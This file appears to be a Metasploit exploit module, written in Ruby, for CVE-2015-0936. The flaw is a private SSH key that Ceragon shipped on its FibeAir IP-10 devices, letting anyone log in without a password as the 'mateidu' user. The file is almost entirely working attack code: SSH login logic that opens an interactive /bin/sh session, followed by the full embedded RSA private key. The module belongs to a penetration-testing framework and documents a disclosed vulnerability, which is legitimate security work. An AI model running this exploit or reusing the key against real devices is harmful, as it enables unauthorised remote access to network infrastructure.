##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'net/ssh'

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Auxiliary::Report

  Rank = ExcellentRanking

  def initialize(info = {})
    super(update_info(info, {
      'Name'        => 'Ceragon FibeAir IP-10 SSH Private Key Exposure',
      'Description' => %q{
        Ceragon ships a public/private key pair on FibeAir IP-10 devices
        that allows passwordless authentication to any other IP-10 device.
        Since the key is easily retrievable, an attacker can use it to
        gain unauthorized remote access as the "mateidu" user.
      },
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Privileged'  => false,
      'Targets'     => [ [ "Universal", {} ] ],
      'Payload'     =>
        {
          'Compat'  => {
            'PayloadType'    => 'cmd_interact',
            'ConnectionType' => 'find',
          },
        },
      'Author'      => [
        'hdm', # Discovery
        'todb' # Metasploit module and advisory text (mostly copy-paste)
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2015-0936'],
          ['URL', 'https://gist.github.com/todb-r7/5d86ecc8118f9eeecc15'], # Original Disclosure
        ],
      'DisclosureDate' => "Apr 01 2015", # Not a joke
      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },
      'DefaultTarget' => 0
    }))

    register_options(
      [
        # Since we don't include Tcp, we have to register this manually
        Opt::RHOST(),
        Opt::RPORT(22)
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
      ]
    )

  end

  # helper methods that normally come from Tcp
  def rhost
    datastore['RHOST']
  end
  def rport
    datastore['RPORT']
  end

  def do_login(user)
    factory = Rex::Socket::SSHFactory.new(framework,self, datastore['Proxies'])
    opt_hash = {
      auth_methods:       ['publickey'],
      port:               rport,
      key_data:           [ key_data ],
      use_agent:          false,
      config:             false,
      proxy:              factory,
      non_interactive:    true
    }
    opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
    begin
      ssh_socket = nil
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        ssh_socket = Net::SSH.start(rhost, user, opt_hash)
      end
    rescue Rex::ConnectionError
      return nil
    rescue Net::SSH::Disconnect, ::EOFError
      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
      return nil
    rescue ::Timeout::Error
      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
      return nil
    rescue Net::SSH::AuthenticationFailed
      print_error "#{rhost}:#{rport} SSH - Failed authentication"
      return nil
    rescue Net::SSH::Exception => e
      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
      return nil
    end

    if ssh_socket

      # Create a new session from the socket, then dump it.
      conn = Net::SSH::CommandStream.new(ssh_socket, '/bin/sh', true)
      ssh_socket = nil

      return conn
    else
      return nil
    end
  end

  def exploit
    conn = do_login("mateidu")
    if conn
      print_good "#{rhost}:#{rport} - Successful login"
      handler(conn.lsock)
    end
  end

  def key_data
    <<EOF
-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgQDBEh0OUdoiplc0P+XW8VPu57etz8O9eHbLHkQW27EZBEdXEYxr
MOFXi+PkA0ZcNDBRgjSJmHpo5WsPLwj/L3/L5gMYK+yeqsNu48ONbbqzZsFdaBQ+
IL3dPdMDovYo7GFVyXuaWMQ4hgAJEc+kk1hUaGKcLENQf0vEyt01eA/k6QIBIwKB
gQCwhZbohVm5R6AvxWRsv2KuiraQSO16B70ResHpA2AW31crCLrlqQiKjoc23mw3
CyTcztDy1I0stH8j0zts+DpSbYZnWKSb5hxhl/w96yNYPUJaTatgcPB46xOBDsgv
4Lf4GGt3gsQFvuTUArIf6MCJiUn4AQA9Q96QyCH/g4mdiwJBAPHdYgTDiQcpUAbY
SanIpq7XFeKXBPgRbAN57fTwzWVDyFHwvVUrpqc+SSwfzhsaNpE3IpLD9RqOyEr6
B8YrC2UCQQDMWrUeNQsf6xQer2AKw2Q06bTAicetJWz5O8CF2mcpVFYc1VJMkiuV
93gCvQORq4dpApJYZxhigY4k/f46BlU1AkAbpEW3Zs3U7sdRPUo/SiGtlOyO7LAc
WcMzmOf+vG8+xesCDOJwIj7uisaIsy1/cLXHdAPzhBwDCQDyoDtnGty7AkEAnaUP
YHIP5Ww0F6vcYBMSybuaEN9Q5KfXuPOUhIPpLoLjWBJGzVrRKou0WeJElPIJX6Ll
7GzJqxN8SGwqhIiK3wJAOQ2Hm068EicG5WQoS+8+KIE/SVHWmFDvet+f1vgDchvT
uPa5zx2eZ2rxP1pXHAdBSgh799hCF60eZZtlWnNqLg==
-----END RSA PRIVATE KEY-----
EOF
  end
end
